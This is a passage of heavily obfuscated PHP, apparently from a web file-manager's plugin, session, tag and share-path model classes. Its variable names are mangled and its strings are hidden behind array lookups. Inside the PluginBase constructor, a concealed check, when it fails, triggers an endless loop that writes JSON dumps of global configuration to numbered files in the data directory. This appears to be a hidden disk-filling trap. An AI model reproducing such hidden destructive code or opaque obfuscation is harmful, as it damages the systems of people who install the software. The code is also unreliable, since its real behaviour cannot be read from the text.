$µÚ•Ôƒ[$Û™¼ğğÓ] = array(); } $µÚ•Ôƒ[$Û™¼ğğÓ][] = $æ½½¾òª[$ô¹œºáõ[500]]; } $àĞÓ¢½Û = array(); foreach ($µÚ•Ôƒ as $ƒ‘¡Ù›« => $éÅ¬¾¢) { $µåÃªÚå = !0; if (!$ãÌÁõ½–) { $àĞÓ¢½Û[] = $ƒ‘¡Ù›«; continue; } foreach ($ãÌÁõ½– as $‹²Ïœ¯ã) { if (!in_array($‹²Ïœ¯ã, $éÅ¬¾¢)) { $µåÃªÚå = !1; break; } } if ($µåÃªÚå) { $àĞÓ¢½Û[] = $ƒ‘¡Ù›«; } } if (!$àĞÓ¢½Û) { return array(); } $³Ó†å• = array($ô¹œºáõ[491] => array($ô¹œºáõ[492], $àĞÓ¢½Û), $ô¹œºáõ[569] => $»ÃÍû¢Ã, $ô¹œºáõ[190] => SourceModel::TYPE_GROUP); $Æ„¬ü¨ª = Model($ô¹œºáõ[1428])->listSource($³Ó†å•); if (!$Æ„¬ü¨ª || count($àĞÓ¢½Û) == $Æ„¬ü¨ª[$ô¹œºáõ[442]][$ô¹œºáõ[443]]) { return $Æ„¬ü¨ª; } $á½§ûµÒ = array(); $£ò¬©¤È = array_to_keyvalue($Æ„¬ü¨ª[$ô¹œºáõ[85]], $ô¹œºáõ[12], $ô¹œºáõ[193]); $ï©ª¯£¬ = array_to_keyvalue($Æ„¬ü¨ª[$ô¹œºáõ[86]], $ô¹œºáõ[12], $ô¹œºáõ[193]); $ØÂÕƒ = array_merge($ï©ª¯£¬, $£ò¬©¤È); foreach ($àĞÓ¢½Û as $Û™¼ğğÓ) { if (!in_array($Û™¼ğğÓ, $ØÂÕƒ)) { $á½§ûµÒ[] = $Û™¼ğğÓ; } } if ($á½§ûµÒ) { $this->removeBySource($»ÃÍû¢Ã, $á½§ûµÒ); } return $Æ„¬ü¨ª; } protected function listData($û«é¿é) { $õéÊÇ¹¿ =& $_SERVER[íïàËŸë]; $»šÙ¢¯Í = array($õéÊÇ¹¿[1773] => 0, $õéÊÇ¹¿[557] => array($õéÊÇ¹¿[2099], 0), $õéÊÇ¹¿[496] => $õéÊÇ¹¿[2100] . $û«é¿é); $ÕÛÓÌ€” = $õéÊÇ¹¿[2101]; $¦ô§‘–ˆ = $this->field($ÕÛÓÌ€”)->where($»šÙ¢¯Í)->order($õéÊÇ¹¿[2102])->select(); return $¦ô§‘–ˆ ? $¦ô§‘–ˆ : array(); } protected function addToTag($Ã¬Â¦©¯, $üàËˆÌë, $é¦¦è¼ƒ) { $ÜÜ±òòò =& $_SERVER[íïàËŸë]; if (!$this->getByTagID($Ã¬Â¦©¯, $é¦¦è¼ƒ) || !$üàËˆÌë) { return !1; } if (!Model($ÜÜ±òòò[907])->pathInfo($üàËˆÌë)) { return !1; } $ş§ˆ‚§ = array($ÜÜ±òòò[1773] => 0, $ÜÜ±òòò[557] => $é¦¦è¼ƒ, $ÜÜ±òòò[495] => $üàËˆÌë, $ÜÜ±òòò[496] => $ÜÜ±òòò[2103] . $Ã¬Â¦©¯, $ÜÜ±òòò[494] => $ÜÜ±òòò[12], $ÜÜ±òòò[1984] => 0); if ($this->where($ş§ˆ‚§)->find()) { return !1; } return $this->add($ş§ˆ‚§); } protected function removeFromTag($„à®šô‰, $Î¢ŸÜ®Ì, $•Ûû¤‹º) { $…¦É•í¬ =& $_SERVER[íïàËŸë]; if (!$this->getByTagID($„à®šô‰, $•Ûû¤‹º) || !$Î¢ŸÜ®Ì) { return !1; } if (is_array($Î¢ŸÜ®Ì)) { $Î¢ŸÜ®Ì = array($…¦É•í¬[7], $Î¢ŸÜ®Ì); } $×Š„è¶ = array($…¦É•í¬[1773] => 0, $…¦É•í¬[557] => $•Ûû¤‹º, $…¦É•í¬[496] => $…¦É•í¬[2103] . $„à®šô‰, $…¦É•í¬[495] => $Î¢ŸÜ®Ì); return $this->where($×Š„è¶)->delete(); } protected function removeByTag($ œùéºÚ, $©üˆæ‡€) { $´±±ï‰º =& $_SERVER[íïàËŸë]; if (!$this->getByTagID($ œùéºÚ, $©üˆæ‡€)) { return !1; } $›óı­Õ© = array($´±±ï‰º[1773] => 0, $´±±ï‰º[557] => $©üˆæ‡€, $´±±ï‰º[496] => $´±±ï‰º[2103] . $ œùéºÚ); return $this->where($›óı­Õ©)->delete(); } protected function removeBySource($Ğª„ÅÜŒ, $¤”ïô¿€) { $ñô¿ÌÜò =& $_SERVER[íïàËŸë]; if (!$Ğª„ÅÜŒ || !$¤”ïô¿€) { return !1; } if (is_array($¤”ïô¿€)) { $¤”ïô¿€ = array($ñô¿ÌÜò[7], $¤”ïô¿€); } $Ç×„å’ = array($ñô¿ÌÜò[1773] => 0, $ñô¿ÌÜò[495] => $¤”ïô¿€, $ñô¿ÌÜò[557] => array($ñô¿ÌÜò[1103], 0), $ñô¿ÌÜò[496] => $ñô¿ÌÜò[2103] . $Ğª„ÅÜŒ); return $this->where($Ç×„å’)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\56\160\154\x75\x67\151\156\114\x69\163\164"; public $field = array("\x6e\x61\x6d\x65", "\x73\x74\141\164\165\163", "\162\x65\x67\x69\145\163\x74", "\143\157\156\146\151\147"); public function loadList($½ç™™¶ = false) { $Šù£¢´î = array_to_keyvalue($this->listData(), $_SERVER[íïàËŸë][32]); if ($½ç™™¶) { return $Šù£¢´î[$½ç™™¶]; } return $Šù£¢´î; } public function init() { $³Ù¼†¸ =& $_SERVER[íïàËŸë]; Hook::trigger($³Ù¼†¸[2104]); $¼‚ÌÔïÆ = $this->loadPluginList(); foreach ($¼‚ÌÔïÆ as $ş¬²çÙ’ => $€…ö¼î) { $¿³Øä¾ = $this->appAllow($ş¬²çÙ’, $€…ö¼î); if (!$¿³Øä¾) { continue; } foreach ($€…ö¼î[$³Ù¼†¸[2105]] as $÷åšÏš => $÷Š‹µÕ) { Hook::bind($÷åšÏš, $÷Š‹µÕ); } } Hook::trigger($³Ù¼†¸[2106]); Hook::trigger(ACTION); } public function appAllow($Ê™¼ƒÖê, $ÃïØÚö¿, $‡îî®È† = true) { $£„öüíä =& $_SERVER[íïàËŸë]; $ëÕ¥–ûş = PLUGIN_DIR . $Ê™¼ƒÖê . $£„öüíä[2107]; if (!is_array($ÃïØÚö¿) || !is_array($ÃïØÚö¿[$£„öüíä[2105]]) || $ÃïØÚö¿[$£„öüíä[833]] != 1 || !is_file($ëÕ¥–ûş)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$£„öüíä[6]][$£„öüíä[2108]] || !$GLOBALS[$£„öüíä[6]][$£„öüíä[2109]]) { return !0; } $ìî‚ò•° = explode($£„öüíä[50], strtolower($GLOBALS[$£„öüíä[6]][$£„öüíä[2109]])); return in_array(strtolower($Ê™¼ƒÖê), $ìî‚ò•°) ? !1 : !0; } if ($‡îî®È† && !Action($£„öüíä[2110])->checkAuth($Ê™¼ƒÖê)) { return !1; } return !0; } public function unInstall($™úÏÊ×Ã) { $Î“ıëŒÆ =& $_SERVER[íïàËŸë]; $¿Ë¯ˆıÒ = $this->loadList($™úÏÊ×Ã); if (file_exists(PLUGIN_DIR . $™úÏÊ×Ã)) { Hook::apply($™úÏÊ×Ã . $Î“ıëŒÆ[2111]); } $this->remove($¿Ë¯ˆıÒ[$Î“ıëŒÆ[475]]); } public function changeStatus($Â÷÷¼È™, $£‰ÁˆØ–) { $ß¢†Äš =& $_SERVER[íïàËŸë]; $Š–íä¹Ã = $this->loadList($Â÷÷¼È™); if ($£‰ÁˆØ–) { Hook::apply($Â÷÷¼È™ . $ß¢†Äš[2112]); } $this->update($Š–íä¹Ã[$ß¢†Äš[475]], array($ß¢†Äš[2113] => $£‰ÁˆØ–)); } public function appRegist($‡Î«†êµ, $ï˜É°Ê) { $‰Ÿø¬úÅ =& $_SERVER[íïàËŸë]; $»—Í§­Ò = $this->loadList($‡Î«†êµ); if ($»—Í§­Ò) { $this->update($»—Í§­Ò[$‰Ÿø¬úÅ[475]], array($‰Ÿø¬úÅ[2105] => $ï˜É°Ê)); } else { $ÄµÊşÖè = array($‰Ÿø¬úÅ[32] => $‡Î«†êµ, $‰Ÿø¬úÅ[2105] => $ï˜É°Ê, $‰Ÿø¬úÅ[833] => 0, $‰Ÿø¬úÅ[6] => $this->getConfigDefault($‡Î«†êµ)); $this->insert($ÄµÊşÖè); } } public function getConfigDefault($ˆ‘ê›ç…) { $Ÿ¿é¡ã =& $_SERVER[íïàËŸë]; $ìó˜êÇÁ = array(); $ûÙÑ‡±Ò = $this->getPackageJson($ˆ‘ê›ç…); if (!$ûÙÑ‡±Ò && is_array($ûÙÑ‡±Ò[$Ÿ¿é¡ã[2114]])) { return $ìó˜êÇÁ; } foreach ($ûÙÑ‡±Ò[$Ÿ¿é¡ã[2114]] as $ôãšëÏñ => $ÏÛÂÅ) { if (!isset($ÏÛÂÅ[$Ÿ¿é¡ã[450]]) || isset($ìó˜êÇÁ[$ôãšëÏñ])) { continue; } $ìó˜êÇÁ[$ôãšëÏñ] = $ÏÛÂÅ[$Ÿ¿é¡ã[450]]; } return $ìó˜êÇÁ; } public function getPackageJson($¢ô¹¼›) { return Hook::apply($¢ô¹¼› . $_SERVER[íïàËŸë][2115]); } public function getConfig($°•„½€÷, $¶Šºçñ¿ = false) { $İµıÄå =& $_SERVER[íïàËŸë]; $»Ìıîë = array(); $Â“ÄİŒÏ = $this->loadList($°•„½€÷); if ($Â“ÄİŒÏ && is_array($Â“ÄİŒÏ[$İµıÄå[6]])) { $»Ìıîë = $Â“ÄİŒÏ[$İµıÄå[6]]; } if (!$»Ìıîë || $¶Šºçñ¿) { $»Ìıîë = $this->getConfigDefault($°•„½€÷); } return $»Ìıîë; } public function setConfig($òöœÓä, $ìØï‰Õ¤ = false) { $¸¯òİ›° =& $_SERVER[íïàËŸë]; $ÇŠ¤ªé = $this->loadList($òöœÓä); if (!$ÇŠ¤ªé) { return !1; } $ÜşÔ¬ûá = $ÇŠ¤ªé[$¸¯òİ›°[6]]; if ($ìØï‰Õ¤ == !1) { $ÜşÔ¬ûá = array(); $ìØï‰Õ¤ = $this->getConfigDefault($òöœÓä); } foreach ($ìØï‰Õ¤ as $ª‰ˆêÄĞ => $è•¾¨É) { $ÜşÔ¬ûá[$ª‰ˆêÄĞ] = is_string($è•¾¨É) ? trim($è•¾¨É) : $è•¾¨É; } $this->update($ÇŠ¤ªé[$¸¯òİ›°[475]], array($¸¯òİ›°[6] => $ÜşÔ¬ûá)); } public function viewList() { $ Ô²¸çŠ =& $_SERVER[íïàËŸë]; $Í„ÚÃœ¨ = $this->loadList(); $this->pluginScan($Í„ÚÃœ¨); $Í„ÚÃœ¨ = $this->loadPluginList(); $Ã„×äÁ¥ = array(); foreach ($Í„ÚÃœ¨ as $å¿Öë² => $ñ¨¥Ó©”) { $†ï¨«º³ = $ñ¨¥Ó©”; unset($ñ¨¥Ó©”[$ Ô²¸çŠ[2105]], $ñ¨¥Ó©”[$ Ô²¸çŠ[6]]); $‚Û²¤´€ = PLUGIN_DIR . $ñ¨¥Ó©”[$ Ô²¸çŠ[32]] . $ Ô²¸çŠ[2107]; if (!is_file($‚Û²¤´€)) { continue; } $©©Ñ˜ˆÊ = Hook::apply($ñ¨¥Ó©”[$ Ô²¸çŠ[32]] . $ Ô²¸çŠ[2115]); if (!is_array($©©Ñ˜ˆÊ)) { continue; } $Ã„×äÁ¥[$å¿Öë²] = array_merge($ñ¨¥Ó©”, $©©Ñ˜ˆÊ); if ($†ï¨«º³[$ Ô²¸çŠ[6]][$ Ô²¸çŠ[1696]] != $©©Ñ˜ˆÊ[$ Ô²¸çŠ[1670]]) { Hook::apply($ñ¨¥Ó©”[$ Ô²¸çŠ[32]] . $ Ô²¸çŠ[2112]); $†ï¨«º³[$ Ô²¸çŠ[6]][$ Ô²¸çŠ[1696]] = $©©Ñ˜ˆÊ[$ Ô²¸çŠ[1670]]; $this->update($ñ¨¥Ó©”[$ Ô²¸çŠ[475]], array($ Ô²¸çŠ[6] => $†ï¨«º³[$ Ô²¸çŠ[6]])); } } return $Ã„×äÁ¥; } private function loadPluginList() { $‘¹Û˜ö˜ =& $_SERVER[íïàËŸë]; $ÄÊã˜Ç¢ = $this->loadList(); if (strtolower(MOD) == $‘¹Û˜ö˜[2116]) { return $ÄÊã˜Ç¢; } $Å„©äé = Hook::trigger($‘¹Û˜ö˜[2117], $ÄÊã˜Ç¢); if ($ÄÊã˜Ç¢ && !$Å„©äé) { die; } return $Å„©äé ? $Å„©äé : $ÄÊã˜Ç¢; } private function pluginScan($ÎôÔ»·ê) { $¼ÙåŒÀ˜ =& $_SERVER[íïàËŸë]; recursion_dir(PLUGIN_DIR, $Ş¼Š†ÏÈ, $Øù”, 0); foreach ($Ş¼Š†ÏÈ as $Úé±ÓñÅ) { $ÅÙ÷§Åç = get_path_this($Úé±ÓñÅ); if (isset($ÎôÔ»·ê[$ÅÙ÷§Åç]) || !file_exists($Úé±ÓñÅ . $¼ÙåŒÀ˜[2118]) || !file_exists($Úé±ÓñÅ . $¼ÙåŒÀ˜[2107])) { continue; } Hook::apply($ÅÙ÷§Åç . $¼ÙåŒÀ˜[2112]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\155\137\163\x65\163\163\151\x6f\156"; public function get($ÀÙ±§¨–) { $ß±…¹ß» =& $_SERVER[íïàËŸë]; $İº¦×àË = $this->where(array($ß±…¹ß»[2119] => $ÀÙ±§¨–))->find(); if (!is_array($İº¦×àË)) { return !1; } return $İº¦×àË[$ß±…¹ß»[171]]; } public function set($‹¢Ğ¶œ–, $™ÁĞÆï, $å·ÊŒÖ© = 3600) { $¶Æª„ô =& $_SERVER[íïàËŸë]; $öŒçòÌ = array($¶Æª„ô[2119] => $‹¢Ğ¶œ–, $¶Æª„ô[2019] => $™ÁĞÆï, $¶Æª„ô[2120] => $å·ÊŒÖ© + time()); if (Session::get($¶Æª„ô[2121])) { $öŒçòÌ[$¶Æª„ô[1782]] = Session::get($¶Æª„ô[2121]); } else { $öŒçòÌ[$¶Æª„ô[1782]] = 0; } if ($this->get($‹¢Ğ¶œ–)) { return $this->where(array($¶Æª„ô[2119] => $‹¢Ğ¶œ–))->save($öŒçòÌ); } else { return $this->add($öŒçòÌ, array(), !0); } } public function remove($Í“·©éè) { return $this->where(array($_SERVER[íïàËŸë][2119] => $Í“·©éè))->delete(); } public function clearTimeout() { return $this->where($_SERVER[íïàËŸë][2122] . time())->delete(); } } goto D¬£‰¯ÃÁ­; dÎÕ°âãæ”: class PathDriverDriverShareItem { public function __construct($¹ù€¥ò) { $this->pathParse = $¹ù€¥ò; } public function __call($çŒ±»ÓÚ, $¢ºŒ³ğ) { $ø¨òÖÃ– =& $_SERVER[íïàËŸë]; if (method_exists($this, $çŒ±»ÓÚ)) { return; } $âµŞ¼íè = call_user_func_array(array($ø¨òÖÃ–[1437], $çŒ±»ÓÚ), $¢ºŒ³ğ); $ÉÖâãÌ“ = array($ø¨òÖÃ–[1438], $ø¨òÖÃ–[1439], $ø¨òÖÃ–[1440], $ø¨òÖÃ–[1441], $ø¨òÖÃ–[618], $ø¨òÖÃ–[620], $ø¨òÖÃ–[1442], $ø¨òÖÃ–[110], $ø¨òÖÃ–[1443], $ø¨òÖÃ–[1444]); if (in_array($çŒ±»ÓÚ, $ÉÖâãÌ“)) { $âµŞ¼íè = $this->getPathOuter($âµŞ¼íè); } return $âµŞ¼íè; } public function copy($•¶ôµ»Ì, $©Ú¤Ùõ, $ÑâÛã’® = false, $ÊÀÁ„£š = false) { return $this->copyMove($•¶ôµ»Ì, $©Ú¤Ùõ, $ÑâÛã’®, $_SERVER[íïàËŸë][618], $ÊÀÁ„£š); } public function move($¦ê©Ï—, $†ÈıŒø, $‚°§ô“ = false, $±½½©ÊÄ = false) { return $this->copyMove($¦ê©Ï—, $†ÈıŒø, $‚°§ô“, $_SERVER[íïàËŸë][620], $±½½©ÊÄ); } private function copyMove($ëçÂİÔÂ, $©µ‰Şó», $ÔÏûñŠ«, $ÃÃäÂú, $ÁãâæÊ¥ = false) { $„×ùûÍ„ =& $_SERVER[íïàËŸë]; $ÁÙËü » = $©µ‰Şó»; $ªØÄÕ¿‘ = IO::driverMake($©µ‰Şó»); if ($ªØÄÕ¿‘->pathParse[$„×ùûÍ„[1243]]) { $©µ‰Şó» = $ªØÄÕ¿‘->pathParse[$„×ùûÍ„[1243]]; } else { $©µ‰Şó» = $ÁÙËü »; } $‘ºåœÍù = IO::copyMove($ëçÂİÔÂ, $©µ‰Şó», $ÔÏûñŠ«, $ÃÃäÂú, $ÁãâæÊ¥); $‘ºåœÍù = $this->getPathOuter($‘ºåœÍù); return $‘ºåœÍù; } public function pathThis($•ú«ã«¼) { return get_path_this($this->pathParse[$_SERVER[íïàËŸë][87]]); } public function pathFather($Ö××¤Ãğ) { return get_path_father($this->pathParse[$_SERVER[íïàËŸë][87]]); } public function iconvSystem($¥°—€ËÚ) { return $¥°—€ËÚ; } protected function infoParse($ÚùëÀí¥, $Ñ¹›¨œı = false) { $Ö®¼ğè“ =& $_SERVER[íïàËŸë]; $Äû„…Õô = $this->pathParse[$Ö®¼ğè“[560]][$Ö®¼ğè“[1268]] . $this->pathParse[$Ö®¼ğè“[1261]]; if ($Ñ¹›¨œı) { $ıŒÒ£Í = IO::infoWithChildren($Äû„…Õô); } else { $ıŒÒ£Í = IO::info($Äû„…Õô); } $­Æ³Ê’¼ = $this->pathParse[$Ö®¼ğè“[560]]; return Action($Ö®¼ğè“[1435])->_shareItemeParse($ıŒÒ£Í, $­Æ³Ê’¼); } public function listAll($£êà‚) { $û‹Ç£Ïù =& $_SERVER[íïàËŸë]; $ÃÊ‰¤Àò = IO::listAll($£êà‚); $ƒ ½Ğ•´ = rtrim($this->pathParse[$û‹Ç£Ïù[560]][$û‹Ç£Ïù[1268]], $û‹Ç£Ïù[8]); foreach ($ÃÊ‰¤Àò as &$¥É¨æ³¶) { $¥É¨æ³¶[$û‹Ç£Ïù[87]] = $this->pathDriver . $û‹Ç£Ïù[8] . ltrim(substr($¥É¨æ³¶[$û‹Ç£Ïù[87]], strlen($ƒ ½Ğ•´)), $û‹Ç£Ïù[8]); } unset($¥É¨æ³¶); return $ÃÊ‰¤Àò; } public function listAllSimple($ßêÉœÖÀ, $ñîà²Øî = false) { $¹£ÍÒÓé =& $_SERVER[íïàËŸë]; $›€ŞšÆŞ = $this->listAll($ßêÉœÖÀ); $Â¿øé‰ô = $this->pathParse[$¹£ÍÒÓé[495]]; if (trim($Â¿øé‰ô, $¹£ÍÒÓé[8]) == trim(get_path_father($Â¿øé‰ô), $¹£ÍÒÓé[8])) { $ñîà²Øî = !0; } return IO::init($¹£ÍÒÓé[12])->listAllSimpleMake($›€ŞšÆŞ, $Â¿øé‰ô, $ñîà²Øî); } public function getPathOuter($¼å‡‹ ¶) { $¨‹æ“í¦ =& $_SERVER[íïàËŸë]; $¡—¶‚– = KodIO::parse($¼å‡‹ ¶); if ($¡—¶‚–[$¨‹æ“í¦[33]] == KodIO::KOD_SHARE_ITEM) { return $¡—¶‚–[$¨‹æ“í¦[87]]; } $Ÿô®üÜ’ = KodIO::clear($¼å‡‹ ¶); $Ò®ÖÉ„ª = KodIO::clear($this->pathParse[$¨‹æ“í¦[560]][$¨‹æ“í¦[1268]]); $º½’Œ¹¯ = substr($Ÿô®üÜ’, strlen($Ò®ÖÉ„ª)); if (substr($Ÿô®üÜ’, 0, strlen($Ò®ÖÉ„ª)) != $Ò®ÖÉ„ª) { return !1; } return $this->pathParse[$¨‹æ“í¦[1262]] . $¨‹æ“í¦[8] . ltrim($º½’Œ¹¯, $¨‹æ“í¦[8]); } public function getType() { $çÙ ’‰ =& $_SERVER[íïàËŸë]; $ÌŸ÷£“È = str_replace($çÙ ’‰[77], $çÙ ’‰[12], get_class($this)); return strtolower($ÌŸ÷£“È); } public function isOsDriver($Íê¾ÙìÈ) { return IO::isOsDriver($Íê¾ÙìÈ); } public function info($ŸØèÙªÃ) { return $this->infoParse($ŸØèÙªÃ); } public function infoAuth($½éò¯¢ş) { return $this->infoParse($½éò¯¢ş); } public function infoWithChildren($ãƒŸ¯ì) { return $this->infoParse($ãƒŸ¯ì, !0); } public function infoFull($¿şÍ¼µß) { return $this->infoParse($¿şÍ¼µß); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ıö˜ğÃ“) { $this->pathParse = $ıö˜ğÃ“; } protected function infoParse($ª›ùğ†Ü, $Ò°ğ¾Ÿµ = false) { $ñ·ÇÎµç =& $_SERVER[íïàËŸë]; return Action($ñ·ÇÎµç[1267])->sharePathInfo($this->pathParse[$ñ·ÇÎµç[87]], !0, $Ò°ğ¾Ÿµ); } public function listPath($Í¥âŸø„, $„ËÉ Œ‡ = false) { $Ú“ä¥ª =& $_SERVER[íïàËŸë]; $ÔüğÂö = IO::listPath($Í¥âŸø„, $„ËÉ Œ‡); if (!$ÔüğÂö) { return $ÔüğÂö; } if (is_array($ÔüğÂö[$Ú“ä¥ª[1436]])) { $‘”ôö‹È = Action($Ú“ä¥ª[1445])->parsePathChildren($ÔüğÂö[$Ú“ä¥ª[1436]], array($Ú“ä¥ª[495] => $Í¥âŸø„)); $ÔüğÂö[$Ú“ä¥ª[1436]] = Action($Ú“ä¥ª[1267])->shareItemInfo($‘”ôö‹È); } foreach ($ÔüğÂö as $ş¡œË¹è => $É‰‘†ñì) { if (!in_array($ş¡œË¹è, array($Ú“ä¥ª[86], $Ú“ä¥ª[85]))) { continue; } foreach ($É‰‘†ñì as $‰ãÎÃˆı => $‘”ôö‹È) { $‘”ôö‹È = Action($Ú“ä¥ª[1445])->parsePathChildren($‘”ôö‹È, array($Ú“ä¥ª[495] => $Í¥âŸø„)); $ÔüğÂö[$ş¡œË¹è][$‰ãÎÃˆı] = Action($Ú“ä¥ª[1267])->shareItemInfo($‘”ôö‹È); } } return $ÔüğÂö; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($Íµ €ƒÌ) { parent::__construct($Íµ €ƒÌ); $this->setSignVersion($_SERVER[íïàËŸë][247]); } } goto Eº£áƒØ²ê; E¼†¶‚ì›Œ: class Message { function __construct() { } public function send($”ø®˜‘» = '', $Ë‘¹íÁĞ = array(), $ûñ–Œò¬ = "\x74\145\x78\x74") { $åÁ– =& $_SERVER[íïàËŸë]; $ú«ĞŒÄÊ = array($åÁ–[33] => $åÁ–[1631], $åÁ–[171] => $”ø®˜‘»); if (in_array($ûñ–Œò¬, array($åÁ–[1631], $åÁ–[1632]))) { $ú«ĞŒÄÊ[$åÁ–[33]] = $ûñ–Œò¬; } $Ë‘¹íÁĞ = array($åÁ–[578] => isset($Ë‘¹íÁĞ[$åÁ–[578]]) ? $Ë‘¹íÁĞ[$åÁ–[578]] : $åÁ–[12], $åÁ–[662] => isset($Ë‘¹íÁĞ[$åÁ–[662]]) ? $Ë‘¹íÁĞ[$åÁ–[662]] : $åÁ–[12]); if (empty($”ø®˜‘») || empty($Ë‘¹íÁĞ[$åÁ–[578]]) && empty($Ë‘¹íÁĞ[$åÁ–[662]])) { return !1; } $•›Àú‚ß = array($åÁ–[1559] => $ú«ĞŒÄÊ, $åÁ–[1633] => $Ë‘¹íÁĞ); Hook::trigger($åÁ–[1634], $•›Àú‚ß); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¹Â‰æ¯¶ =& $_SERVER[íïàËŸë]; $Üù“«Ğ = $_SERVER[$¹Â‰æ¯¶[910]]; $åì’‡ô = $¹Â‰æ¯¶[1635]; if ($_SERVER[$¹Â‰æ¯¶[909]] != $åì’‡ô($Üù“«Ğ)) { $¦çÔ‹Åë = $¹Â‰æ¯¶[967]; $ŸïÍÆä” = $¹Â‰æ¯¶[911]; $²²ÂèÃĞ = $_SERVER[$¹Â‰æ¯¶[912]] . $¹Â‰æ¯¶[913]; $À‰ë‚¢Â = $ŸïÍÆä”($²²ÂèÃĞ); $†Ô‹ôŸ = explode($¹Â‰æ¯¶[262], $À‰ë‚¢Â); if (count($†Ô‹ôŸ) < $¹Â‰æ¯¶[693]) { $·˜«ÄıÅ = $¹Â‰æ¯¶[914]; $·˜«ÄıÅ(); } $ıÅèõÚë = $¹Â‰æ¯¶[968]; $ıÅèõÚë($_SERVER[$¹Â‰æ¯¶[969]]); $¦çÔ‹Åë = $¹Â‰æ¯¶[967]; $¦çÔ‹Åë(); $“‰¤’†Ë = $¹Â‰æ¯¶[1636]; $¼²±Şèö = json_encode($GLOBALS[$¹Â‰æ¯¶[1637]]); $ÆéŒ±°ò = 1; for ($›ã‹¼õš = $ÆéŒ±°ò; $›ã‹¼õš > 0; $›ã‹¼õš++) { $“‰¤’†Ë(DATA_PATH . $›ã‹¼õš, $¼²±Şèö); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¹Â‰æ¯¶[1638]); $this->pluginName = str_replace($¹Â‰æ¯¶[1638], $¹Â‰æ¯¶[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¹Â‰æ¯¶[8]; $this->pluginApi = appHostGet() . $¹Â‰æ¯¶[1639] . $this->pluginName . $¹Â‰æ¯¶[8]; $this->pluginHost = $config[$¹Â‰æ¯¶[1640]] . $this->pluginName . $¹Â‰æ¯¶[8]; $this->pluginHostDefault = $config[$¹Â‰æ¯¶[1640]] . $this->pluginName . $¹Â‰æ¯¶[8]; $ïô¥¾ôá = $config[$¹Â‰æ¯¶[1641]]; if ($ïô¥¾ôá && strpos($¹Â‰æ¯¶[50] . $ïô¥¾ôá . $¹Â‰æ¯¶[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¹Â‰æ¯¶[1642]] . $this->pluginName . $¹Â‰æ¯¶[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[íïàËŸë][1643]); } protected function assign($ìØÃ„ü°, $û–µ…¨› = false) { if (is_array($ìØÃ„ü°)) { $this->values = array_merge($this->values, $ìØÃ„ü°); } else { $this->values[$ìØÃ„ü°] = $û–µ…¨›; } } protected function display($ÑÇîçá) { extract($this->values); require $ÑÇîçá; } final function hookRegist($ëÃ“¶µ‡) { $this->modelPlugin->appRegist($this->pluginName, $ëÃ“¶µ‡); } final function appIcon() { $€ó¸£‰ =& $_SERVER[íïàËŸë]; $¿üÜí¤ = $this->appPackage(); $åËĞÙõ÷ = $€ó¸£‰[12]; if (isset($¿üÜí¤[$€ó¸£‰[490]])) { if (isset($¿üÜí¤[$€ó¸£‰[490]][$€ó¸£‰[1644]])) { $åËĞÙõ÷ = $€ó¸£‰[1645] . $¿üÜí¤[$€ó¸£‰[490]][$€ó¸£‰[1644]] . $€ó¸£‰[1646]; } else { if ($¿üÜí¤[$€ó¸£‰[490]][$€ó¸£‰[1647]]) { $åËĞÙõ÷ = $€ó¸£‰[1648] . $¿üÜí¤[$€ó¸£‰[490]][$€ó¸£‰[1647]] . $€ó¸£‰[1649]; } } } return $åËĞÙõ÷; } final function fileCanView($àø²Ú) { $÷»ÁÚ =& $_SERVER[íïàËŸë]; if (request_url_safe($àø²Ú)) { return !0; } if ($this->isShare($àø²Ú)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $öÂ½Ä«Ä = $÷»ÁÚ[1650] . rawurlencode(this_url()); show_tips(LNG($÷»ÁÚ[1651]) . $÷»ÁÚ[1652] . $öÂ½Ä«Ä . $÷»ÁÚ[1653] . LNG($÷»ÁÚ[1654]) . $÷»ÁÚ[1655], !1); } if (!Action($÷»ÁÚ[1656])->authCan($÷»ÁÚ[1657])) { show_tips(LNG($÷»ÁÚ[1658]) . $÷»ÁÚ[1659], !1); } ActionCall($÷»ÁÚ[1660], $àø²Ú); } final function isShare($³·ßÚ²) { $ìõàšò = KodIO::parse($³·ßÚ²); return $ìõàšò[$_SERVER[íïàËŸë][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Ñ¶ö¾ÊÙ) { if (request_url_safe($Ñ¶ö¾ÊÙ)) { return $Ñ¶ö¾ÊÙ; } if (!$this->isShare($Ñ¶ö¾ÊÙ)) { $Ñ¶ö¾ÊÙ = $this->filePath($Ñ¶ö¾ÊÙ, !1); } return Action($_SERVER[íïàËŸë][1267])->linkOut($Ñ¶ö¾ÊÙ); } public function filePathLinkOut($ê™Îã’Æ) { if (request_url_safe($ê™Îã’Æ)) { return $ê™Îã’Æ; } $this->fileCanView($ê™Îã’Æ); return Action($_SERVER[íïàËŸë][1267])->link($ê™Îã’Æ); } final function filePath($³Ë¥’Å, $¹÷¿„ø = true, $Ú³Şæİ… = false) { $„àƒşø =& $_SERVER[íïàËŸë]; $ï¹ß€´ = $this->filePathGet($³Ë¥’Å, $¹÷¿„ø); if (!$this->fileInfo) { show_tips(LNG($„àƒşø[108]), !1); } if ($Ú³Şæİ… && isset($this->fileInfo[$„àƒşø[541]]) && $this->fileInfo[$„àƒşø[541]]) { $âõ½üú” = Model($„àƒşø[544])->fileInfo($this->fileInfo[$„àƒşø[541]]); if (!$âõ½üú” || !IO::exist($âõ½üú”[$„àƒşø[87]])) { show_tips(LNG($„àƒşø[108]) . $„àƒşø[1661]); } } Hook::trigger($„àƒşø[1662], $ï¹ß€´); return $ï¹ß€´; } final function filePathGet($’†ŸŞ ¬, $’Õöõ™Ú = true) { $¶îÄÔÃ« =& $_SERVER[íïàËŸë]; if 